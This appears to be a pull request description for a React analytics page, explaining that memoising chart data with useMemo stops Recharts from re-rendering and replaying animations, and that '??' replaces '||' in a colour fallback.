`distData` and `avgData` in `client/src/pages/Analytics.tsx` were computed inline in the component body on every render. Because they produce new array and object references each time, Recharts re-renders all chart children — including playing entrance animations — on every re-render triggered by unrelated events (tooltip hover, theme toggle, window resize). On lower-end devices this causes visible chart jank.

Wrapping both values in `useMemo` makes the references stable between renders. Recharts and its child `Cell` components will only re-render when the underlying `stats` data actually changes.

Also replaces the `|| "#94a3b8"` fallback with `?? "#94a3b8"` (nullish coalescing) which is strictly more correct for the colour lookup — `||` would incorrectly substitute the fallback colour for any falsy string value.
